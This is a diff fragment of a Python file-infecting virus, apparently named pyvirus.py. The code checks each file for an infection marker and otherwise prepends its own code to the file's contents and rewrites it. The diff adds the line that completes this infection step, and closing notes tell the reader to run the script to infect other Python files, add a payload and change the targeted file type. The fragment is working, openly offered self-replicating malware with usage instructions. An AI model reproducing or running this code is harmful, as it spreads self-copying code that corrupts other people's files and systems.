@@ -35,29 +35,34 @@ for f in files:   #for each file this will do bellow things
     filecode = file.readlines()
     file.close()
 
+
+#Check if the file is already infected
+
     infected = False
+
+
     for line in filecode:
         if(re.search("^#start of virus code", line)):
             infected = True
-            break
+            break #Already Infectedd
 
         if not infected:
             newCode = []
-            
             newCode.extend(viruscode)
+            newCode.extend(filecode)
+            
+            
             
             #now re-write the infected file with virus code and old code
             file = open(f,"w")
             file.writelines(newCode)
             file.close
+            
+    #payload
 
-
-    #paylode
     print("Infection Completed")
 
-
-
-
-
-
-#end of virus code#start of virus code
+#end of virus code
+* run pyvirus.py to infect other py files with the same code. 
+* use your infection  with payload at the end
+* you can change the file type at glob.glob() at line 32
